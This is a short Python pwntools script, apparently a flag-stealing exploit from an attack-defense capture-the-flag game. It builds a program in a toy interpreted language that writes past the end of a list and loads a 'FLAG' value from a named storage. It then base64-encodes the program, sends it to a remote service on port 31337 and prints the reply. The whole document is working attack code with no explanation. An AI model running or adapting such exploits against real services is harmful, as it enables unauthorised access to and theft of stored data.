#!/usr/bin/env python3

from pwn import *

target  = sys.argv[1]
storage = sys.argv[2]

xpl01t_bbn = f'''jungle {storage}
\tkek
babuin main()
\tbanana ebaka = [0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2]]
\tebaka[8][0]  = {storage}()
\tebaka[10]    = 6
\tprint(load(ebaka[8][0], "FLAG")); print("\\n")
\thoard 0'''
print(xpl01t_bbn)

io = remote(target, 31337)
io.sendline(base64.b64encode(xpl01t_bbn.encode()))
print(io.recvall(), flush=True)
